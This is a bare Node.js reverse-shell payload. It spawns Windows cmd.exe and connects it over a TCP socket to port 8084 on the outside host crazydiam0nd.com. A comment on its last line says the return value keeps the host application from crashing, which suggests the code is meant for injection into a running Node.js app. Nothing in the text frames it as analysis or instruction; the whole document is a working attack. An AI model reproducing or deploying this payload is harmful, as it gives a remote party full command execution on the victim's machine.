    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("C:\Windows\System32\cmd.exe", []);
        var client = new net.Socket();
        client.connect(8084, "crazydiam0nd.com", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();
    
